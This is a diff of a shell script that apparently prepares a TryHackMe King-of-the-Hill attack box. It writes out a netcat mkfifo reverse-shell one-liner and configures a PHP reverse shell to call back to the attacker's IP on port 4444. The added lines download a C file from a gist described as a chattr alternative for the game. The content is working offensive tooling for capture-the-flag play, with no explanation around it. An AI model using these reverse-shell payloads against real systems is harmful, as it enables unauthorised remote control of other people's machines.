@@ -30,4 +30,7 @@ echo "useful payloads"
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(hostname -i) 4444 >/tmp/f" > nc-rev.txt
 cp /usr/share/webshells/php/php-reverse-shell.php ./reverse.php && sed -i "s/PUT_THM_ATTACKBOX_IP_HERE/$(hostname -i)/g" reverse.php && sed -i "s/1234/4444/g" reverse.php
 
+echo "chattr alternative for koth (as mf.c, uncompiled)"
+wget -q https://gist.githubusercontent.com/ChrisPritchard/05d98e1d195bc255b30674c8ce0fec50/raw/44b4079a5317820db6789b90a0c6d0dfb2330609/mf.c -O mf.c
+
 echo "ready!"
